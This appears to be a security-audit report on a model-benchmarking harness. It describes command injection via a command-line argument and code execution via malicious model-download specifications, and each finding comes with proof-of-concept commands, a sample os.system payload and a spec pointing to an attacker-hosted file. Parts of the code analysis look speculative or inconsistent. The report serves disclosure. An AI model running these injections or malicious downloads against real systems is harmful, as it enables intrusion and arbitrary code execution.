### Vulnerability List:

- Vulnerability Name: Command Injection via `--command_args` in `harness.py`
- Description:
    1. An attacker can supply a malicious string to the `--command_args` parameter when executing `harness.py`.
    2. The `harness.py` script takes this string and passes it directly as arguments to the benchmark command without proper sanitization or validation.
    3. This allows the attacker to inject arbitrary commands into the system command executed by `harness.py`.
    4. For example, an attacker could use a benchmark specification file along with the following command: `benchmarking/harness.py --framework tflite --platform host --model_cache /tmp/cache -b specifications/models/tflite/mobilenet_v2/mobilenet_v2_0.35_96.json --info '{"treatment": {}}' --command_args "; touch /tmp/pwned ;"`
    5. When `harness.py` executes the benchmark, the injected command `; touch /tmp/pwned ;` will be executed, creating a file named `pwned` in the `/tmp` directory.
- Impact:
    - **Critical**. Successful exploitation allows arbitrary command execution on the server or device running the benchmark.
    - An attacker can gain full control of the system, potentially leading to data breaches, malware installation, or denial of service.
- Vulnerability Rank: Critical
- Currently Implemented Mitigations:
    - None. The code directly passes the `--command_args` to the subprocess without any sanitization.
- Missing Mitigations:
    - Input sanitization and validation for the `--command_args` parameter in `harness.py`.
    - Implement a secure way to pass extra arguments to the benchmark command, possibly by using a dedicated configuration file or a more structured data format.
    - Principle of least privilege: Run benchmark processes with minimal necessary privileges.
- Preconditions:
    - The attacker needs to be able to execute `harness.py` with arbitrary arguments. This is possible if the benchmarking platform is exposed to external users or if an attacker can influence the benchmark execution process.
- Source Code Analysis:
    1. File: `/code/benchmarking/harness.py`
    2. The `argparse` library is used to parse command-line arguments, including `--command_args`:
    ```python
    parser = argparse.ArgumentParser()
    ...
    parser.add_argument(
        "--command_args",
        help="Specify optional command arguments that would go with the "
        "main benchmark command",
    )
    ...
    self.args, self.unknowns = parser.parse_known_args(raw_args)
    ```
    3. The `BenchmarkDriver` class initializes and parses arguments in its `__init__` method.
    4. The `runBenchmark` method calls `runOneBenchmark` function, passing `self.args.command_args` without any sanitization:
    ```python
    def runBenchmark(self, info, platform, benchmarks):
        ...
        status = runOneBenchmark(
            i,
            b,
            framework,
            platform,
            self.args.platform, # platform name, not used in command execution directly
            reporters,
            self._lock,
            self.args.cooldown,
            self.args.user_identifier,
            self.args.local_reporter,
        )
        ...
    ```
    5. File: `/code/benchmarking/driver/benchmark_driver.py`
    6. The `runOneBenchmark` function receives `command_args` within the `info` dictionary, under the key `meta.command_args`:
    ```python
    def runOneBenchmark(
        info,
        benchmark,
        framework,
        platform,
        backend, # backend name, not used in command execution directly
        reporters,
        lock,
        cooldown=None,
        user_identifier=None,
        local_reporter=None,
    ):
        ...
        info["meta"]["command_args"] = (
            self.args.command_args if self.args.command_args else "" # potential vulnerability: args.command_args comes from user input without sanitization
        )
        ...
    ```
    7. The `_runOnePass` function constructs and executes the benchmark command. The `command_args` from `info["meta"]["command_args"]` is directly appended to the command:
    ```python
    def _runOnePass(info, benchmark, framework, platform):
        ...
        command = framework.composeRunCommand(
            test["commands"], # commands from benchmark specification
            platform,
            programs,
            benchmark["model"],
            test,
            tgt_model_files,
            tgt_input_files,
            tgt_result_files,
            shared_libs,
            test_files,
            main_command=True,
        )
        if command:
            if isinstance(command, list):
                command[0] += " " + info["meta"]["command_args"] # potential vulnerability: command_args is appended without sanitization
            elif isinstance(command, str):
                command += " " + info["meta"]["command_args"] # potential vulnerability: command_args is appended without sanitization
        ...
        output, _ = platform.runBenchmark(command, platform_args=platform_args) # command is executed by platform.runBenchmark
        ...
    ```
    8. The `composeRunCommand` method in each framework (e.g., `/code/benchmarking/frameworks/tflite/tflite.py`) is responsible for constructing the final command string, and it receives the `command_args`.
    9. No sanitization or validation is performed on `info["meta"]["command_args"]` before it's appended to the command and executed. This allows command injection.

- Security Test Case:
    1. Prepare a benchmark specification file (e.g., `poc_benchmark.json`) with minimal content, sufficient for `harness.py` to run without errors. Example:
    ```json
    {
      "model": {
        "name": "poc_model",
        "framework": "tflite",
        "format": "tflite",
        "files": {}
      },
      "tests": [
        {
          "identifier": "poc_test",
          "metric": "delay",
          "inputs": {},
          "commands": [
            "{program}"
          ]
        }
      ]
    }
    ```
    2. Run `harness.py` with the malicious `--command_args` parameter. Assume the project directory is `/FAI-PEP/code/benchmarking`:
    ```bash
    cd /FAI-PEP/code/benchmarking
    python harness.py --framework tflite --platform host --model_cache /tmp/cache -b poc_benchmark.json --info '{"treatment": {}}' --command_args "; touch /tmp/pwned ;"
    ```
    3. After the command execution, check if the file `/tmp/pwned` exists on the system:
    ```bash
    ls /tmp/pwned
    ```
    4. If the file `/tmp/pwned` exists, the command injection vulnerability is confirmed.

- Vulnerability Name: Model Specification Injection leading to Arbitrary Code Execution
- Description:
    1. An attacker crafts a malicious model specification JSON file.
    2. Within this specification, the attacker provides a download link (`location`) that points to a file hosted on a malicious third-party storage. This file is disguised as a legitimate model file but contains executable code or scripts.
    3. The victim user, intending to benchmark a model, uses this malicious specification file with the benchmarking platform.
    4. The benchmarking platform, as designed, downloads the file from the attacker-controlled URL to the local model cache.
    5. If the attacker bypasses or compromises the MD5 hash check, the benchmarking platform proceeds to process the downloaded file.
    6. During the "processing" phase, which might involve framework-specific loading or initialization of the model, the malicious code embedded in the downloaded file gets executed on the benchmarking system.
- Impact:
    - **Critical**: Arbitrary code execution on the benchmarking system. This can lead to complete system compromise, data theft, installation of malware, or denial of service.
- Vulnerability Rank: Critical
- Currently Implemented Mitigations:
    - **MD5 Hash Verification**: The system downloads models based on URLs specified in JSON specifications and verifies the MD5 hash of the downloaded file against the hash provided in the specification. This is intended to ensure model integrity. (Source: `/code/README.md`, `/code/benchmarking/download_benchmarks/download_benchmarks.py`)
- Missing Mitigations:
    - **Input Validation and Sanitization**: Lack of robust validation of model specification files beyond MD5 hash check. The system should validate the structure and content of the specification files to prevent injection of malicious commands or scripts.
    - **Sandboxing or Isolation**: The benchmarking process, especially model loading and processing, is not sandboxed or isolated. This allows any malicious code within a compromised model to directly interact with the system.
    - **Code Review and Security Audits**: Missing regular code reviews and security audits specifically focusing on the model specification handling and download mechanisms.
- Preconditions:
    1. The attacker needs to host a malicious file on a third-party storage that can be accessed via a URL.
    2. The attacker needs to create a malicious model specification JSON file that includes the URL to the malicious file and a corresponding (potentially fake or compromised) MD5 hash.
    3. The victim user must be tricked into using this malicious model specification file, for example, by downloading it from an untrusted source or by social engineering.
- Source Code Analysis:
    1. **`/code/benchmarking/download_benchmarks/download_benchmarks.py`**:
        - `DownloadBenchmarks.downloadFile(self, location, md5)` function is responsible for downloading model files.
        - It checks if a file exists in the local cache and if the provided `md5` matches the cached file's MD5.
        - If the MD5 doesn't match or the file is not in the cache, it proceeds to download the file using `DownloadFile` class.
        - **Vulnerability Point**: While MD5 hash verification is implemented, if an attacker can provide a malicious model file along with its MD5 hash (e.g., by compromising a third-party storage or using a man-in-the-middle attack during hash retrieval if it's also downloaded), the system will trust the file after MD5 verification and proceed with processing, potentially executing malicious code.

    2. **`/code/benchmarking/run_bench.py`, `/code/benchmarking/harness.py`**:
        - These scripts are the main entry points for running benchmarks.
        - `run_bench.py` parses command line arguments and loads configurations.
        - `harness.py` orchestrates the benchmark execution, including model loading and framework interaction.
        - **Vulnerability Point**: These scripts use the downloaded model files as specified in the benchmark JSON. If a malicious model is downloaded due to a compromised specification, these scripts will unknowingly use it, leading to potential code execution during model loading or processing by the ML framework.

    3. **`/code/specifications/models/caffe2/squeezenet/squeezenet.json`** (Example Model Specification):
        ```json
        {
          "model": {
            "category": "CNN",
            "description": "SqueezeNet v1.1",
            "files": {
              "init": {
                "filename": "init_net.pb",
                "location": "https://...",  // Potentially malicious URL
                "md5": "...", // Compromised MD5 hash
              },
              "predict": {
                "filename": "predict_net.pb",
                "location": "https://...",  // Potentially malicious URL
                "md5": "...", // Compromised MD5 hash
              }
            },
            "format": "caffe2",
            "kind": "deployment",
            "name": "squeezenet"
          },
          "tests": [...]
        }
        ```
        - **Vulnerability Point**: The `location` field in the model specification is directly used to download files. There is no validation on the URL itself (e.g., allowed domains, protocols) or the file type being downloaded.

- Security Test Case:
    1. **Setup Malicious Model**: Create a simple Python script `malicious_model.py` that will be hosted as a "model file". This script should contain code to execute a command on the system, for example, creating a file in `/tmp`.
        ```python
        # malicious_model.py
        import os
        os.system('touch /tmp/attack_success.txt')
        print("Malicious code executed!")
        ```
        Zip this script to create `malicious_model.zip`.
    2. **Host Malicious Model**: Host `malicious_model.zip` on a publicly accessible web server (e.g., using a service like Python's `http.server` for testing purposes). Get the URL of this hosted zip file.
    3. **Craft Malicious Specification**: Create a model specification JSON file (e.g., `malicious_spec.json`) that points to the hosted `malicious_model.zip` URL. Generate the MD5 hash of `malicious_model.zip` and include it in the specification.
        ```json
        {
          "model": {
            "category": "Malicious",
            "description": "Malicious Model Specification",
            "files": {
              "predict": {
                "filename": "predict_net.pb",
                "location": "http://<attacker-server>/malicious_model.zip", // Replace with your malicious server URL
                "md5": "<MD5 hash of malicious_model.zip>" // Replace with the actual MD5 hash
              }
            },
            "format": "caffe2",
            "kind": "deployment",
            "name": "malicious_model"
          },
          "tests": [
            {
              "commands": [
                "{program} --net {files.predict} --warmup 1 --iter 1" // Minimal command
              ],
              "identifier": "malicious_test",
              "iter": 1,
              "metric": "delay",
              "warmup": 1
            }
          ]
        }
        ```
    4. **Run Benchmarking with Malicious Specification**: Execute the benchmarking platform using the crafted `malicious_spec.json` file.
        ```bash
        benchmarking/run_bench.py -b malicious_spec.json --model_cache /tmp/model_cache --info '{"treatment": {"programs": {}}}' --framework generic --platform host
        ```
    5. **Verify Exploit**: Check if the file `/tmp/attack_success.txt` has been created on the benchmarking system. If it exists, it confirms that the malicious code from `malicious_model.zip` was executed, demonstrating arbitrary code execution vulnerability. Also, check the output logs for "Malicious code executed!".

- Vulnerability Name: Unsafe Model Deserialization leading to Arbitrary Code Execution
- Description:
  1. An attacker crafts a malicious model specification file (e.g., `malicious_model.json`).
  2. This malicious file contains a modified or replaced `location` field within the `files` section of the model specification. Instead of pointing to a legitimate model file, this `location` URL points to a malicious file hosted by the attacker.
  3. The attacker submits this malicious model specification file to the benchmarking platform, either directly or by influencing a user to run a benchmark using this file.
  4. When the benchmarking platform processes the malicious model specification file, specifically in the `BenchmarkCollector.collectBenchmarks` function, it extracts the `location` URL.
  5. The `DownloadBenchmarks.downloadFile` function is then invoked to download the file from the attacker-controlled URL.
  6. The downloaded malicious file, without sufficient security checks (like type validation or sandboxing), is saved to the `model_cache` directory.
  7. Subsequently, when the benchmarking harness attempts to load and process the model for benchmarking (e.g., in `frameworks/caffe2/caffe2.py` or `frameworks/tflite/tflite.py`), the malicious code within the file is executed, leading to arbitrary code execution on the benchmarking platform's server or device.
- Impact:
  - Critical. Successful exploitation allows an attacker to achieve arbitrary code execution on the benchmarking platform. This could lead to:
    - Full compromise of the benchmarking system.
    - Data exfiltration, including benchmark results, system configurations, and potentially sensitive information.
    - Installation of malware or backdoors for persistent access.
    - Lateral movement to other systems within the infrastructure if the benchmarking platform is part of a larger network.
- Vulnerability Rank: Critical
- Currently Implemented Mitigations:
  - **MD5 Hash Verification:** The system attempts to verify the integrity of downloaded models using MD5 hashes specified in the model specification files.
    - **Location:** `benchmarking/download_benchmarks/download_benchmarks.py` and `benchmarking/download_benchmarks/download_benchmarks.py -> DownloadBenchmarks._updateOneFile` and `benchmarking/download_benchmarks/download_benchmarks.py -> DownloadBenchmarks.downloadFile`
- Missing Mitigations:
  - **Input Validation and Sanitization:** The system lacks robust validation of the model specification file content, especially the `location` URLs. It does not prevent users from submitting specifications with URLs pointing to attacker-controlled resources.
  - **File Type Validation:** There's no check to ensure that downloaded files are of the expected type (e.g., protobuf for Caffe2, TFLite model, etc.) before attempting to load them.
  - **Sandboxing/Isolation:** Model loading and processing are not sandboxed or isolated. This means that if a malicious model executes code, it runs with the same privileges as the benchmarking harness.
  - **Regular Security Audits and Penetration Testing:** Not explicitly mentioned in the provided files, but crucial for identifying and addressing vulnerabilities.
- Preconditions:
  1. The attacker needs to be able to provide or influence the model specification file used for a benchmark run. This could be achieved by:
     - Submitting a pull request with a modified model specification.
     - Convincing a user to run a benchmark with a malicious specification file.
     - If the system has a web interface or API for submitting benchmarks, exploiting vulnerabilities there to inject the malicious file.
  2. The benchmarking platform must process the attacker-provided model specification file.
  3. The attacker must have a way to host a malicious file at a publicly accessible URL.
- Source Code Analysis:

  1. **`benchmarking/benchmarks/benchmarks.py` -> `BenchmarkCollector.collectBenchmarks`**:
     - This function is responsible for collecting benchmarks based on a source file (`source`).
     - It reads the benchmark specification from the JSON file.
     - It iterates through benchmarks defined in the file.
     - Crucially, it calls `self._collectOneBenchmark` for each benchmark.

  2. **`benchmarking/benchmarks/benchmarks.py` -> `BenchmarkCollector._collectOneBenchmark`**:
     - Reads the content of a single benchmark specification file.
     - Calls `self._updateFiles` to handle model and related files.

  3. **`benchmarking/benchmarks/benchmarks.py` -> `BenchmarkCollector._updateFiles`**:
     - Iterates through "files" and "libraries" sections of the model specification.
     - Calls `self._collectOneFile` and `self._updateOneFile` to process each file entry.

  4. **`benchmarking/benchmarks/benchmarks.py` -> `BenchmarkCollector._updateOneFile`**:
     - This function checks if an MD5 hash is provided for a file.
     - It calls `self._copyFile` to download or copy the file to the `model_cache`.
     - **Vulnerability Point:** While it checks for MD5, it does not validate the `location` URL itself (e.g., protocol, domain). It blindly trusts the URL provided in the JSON.

  5. **`benchmarking/benchmarks/benchmarks.py` -> `BenchmarkCollector._copyFile`**:
     - Handles downloading files from HTTP URLs using `requests.get(location)`.
     - Saves the downloaded file to the `model_cache`.
     - **Mitigation:** Implements MD5 hash verification after download to check for file integrity. However, this only verifies integrity, not safety or file type.

  6. **Framework-specific model loading (e.g., `benchmarking/frameworks/caffe2/caffe2.py`, `benchmarking/frameworks/tflite/tflite.py`)**:
     - The code for loading models in framework-specific files (not provided in PROJECT FILES) is where the downloaded files are actually loaded and processed by the ML frameworks.
     - **Vulnerability Point:** If these framework-specific loading functions are not secure (e.g., using `pickle.load` without proper sanitization or loading ONNX models with vulnerabilities), they could execute malicious code embedded in a manipulated model file.

- Security Test Case:

  1. **Setup:**
     - Set up a publicly accessible web server (e.g., using Python's `http.server` or a cloud storage service).
     - Create a malicious file (e.g., `malicious_model.json`). This file should contain a JSON structure mimicking a valid model specification but with a modified `location` URL pointing to a malicious payload hosted on your web server. The malicious payload could be a Python script embedded in a seemingly valid model file (if loading mechanism is vulnerable to deserialization attacks) or any other executable code disguised as a model. For simplicity, let's assume the malicious file is a text file that, when "loaded" by a vulnerable loader, would execute a simple command like `os.system('touch /tmp/pwned')`.
     - Host the malicious payload file (e.g., `malicious_payload.txt`) on your web server, accessible via HTTP.
     - Create a valid benchmark JSON file (e.g., `test_benchmark.json`) and modify it to include the malicious model specification, replacing a legitimate model `location` with the URL of your `malicious_model.json` file.

  2. **Execution:**
     - Run the benchmarking platform using the modified benchmark JSON file (`test_benchmark.json`) against a publicly accessible instance of the project.
     - Command example: `benchmarking/run_bench.py -b test_benchmark.json --model_cache /tmp/model_cache --platform host --framework caffe2 --info '{"treatment": {"commit": "test"}}'` (adjust arguments as needed for your setup).

  3. **Verification:**
     - After the benchmark run completes (or appears to complete), check if the malicious code execution was successful. In this example, check if the file `/tmp/pwned` was created on the benchmarking platform's server.
     - Examine the logs of the benchmarking platform for any error messages or unusual activity.
     - If `/tmp/pwned` exists, it confirms that arbitrary code execution was achieved through the malicious model specification file.
